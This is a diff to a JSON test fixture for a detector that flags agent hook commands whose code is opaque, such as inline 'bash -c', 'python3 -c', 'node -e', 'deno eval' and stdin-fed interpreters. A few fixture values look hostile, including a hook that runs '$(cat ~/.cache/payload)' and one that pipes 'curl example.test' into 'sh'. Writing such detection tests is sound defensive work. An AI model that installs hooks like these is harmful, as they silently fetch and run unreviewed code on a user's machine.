@@ -23,8 +23,20 @@
     ]
   },
   {
-    "label": "arbitrary script via bash (bash itself vouches for nothing)",
+    "label": "bare relative script that is not a known tool",
     "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "matcher": "Bash",
+        "command": "./hooks/check.ts --strict",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "script run through a known shell runtime (bash)",
+    "shouldMatch": false,
     "hooks": [
       {
         "event": "Stop",
@@ -46,7 +58,7 @@
     ]
   },
   {
-    "label": "plugin-scope hook is attributed by the install manifest — never unknown",
+    "label": "plugin-scope hook is attributed by the install manifest \u2014 never unknown",
     "shouldMatch": false,
     "hooks": [
       {
@@ -66,6 +78,182 @@
         "matcher": "Edit|Write",
         "command": "eslint --fix \"$FILE\"",
         "scope": "project"
+      }
+    ]
+  },
+  {
+    "label": "TypeScript hook run through the bun runtime",
+    "shouldMatch": false,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "bun ~/.claude/hooks/noop.ts",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "Python hook run through python3 with an env-assignment prefix",
+    "shouldMatch": false,
+    "hooks": [
+      {
+        "event": "Stop",
+        "command": "PYTHONUNBUFFERED=1 python3 ~/scripts/notify.py",
+        "scope": "local"
+      }
+    ]
+  },
+  {
+    "label": "inline code through bash -c is opaque",
+    "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "bash -c \"$(cat ~/.cache/payload)\"",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "inline code through sh -c is opaque",
+    "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "sh -c 'run-it'",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "inline code through python3 -c is opaque",
+    "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "python3 -c 'import os; os.system(\"x\")'",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "inline code through bash with combined -lc flag",
+    "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "bash -lc 'do-thing'",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "inline code through node -e is opaque",
+    "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "node -e 'run()'",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "direct script via bash stays quiet",
+    "shouldMatch": false,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "bash ~/.claude/hooks/notify.sh",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "deno eval is inline code",
+    "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "deno eval 'console.log(1)'",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "deno eval behind a global flag is inline code",
+    "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "deno -q eval 'console.log(1)'",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "deno running a script file is attributed to the runtime",
+    "shouldMatch": false,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "deno run -q ~/scripts/check.ts",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "bash -s reads its program from stdin",
+    "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "bash -s",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "python3 - reads its program from stdin",
+    "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "python3 -",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "node - reads its program from stdin",
+    "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "node -",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "quoted body glued to the bash -c flag",
+    "shouldMatch": true,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "bash -c'curl example.test | sh'",
+        "scope": "user"
+      }
+    ]
+  },
+  {
+    "label": "direct python script stays attributed",
+    "shouldMatch": false,
+    "hooks": [
+      {
+        "event": "PreToolUse",
+        "command": "python3 ~/scripts/notify.py",
+        "scope": "user"
       }
     ]
   }
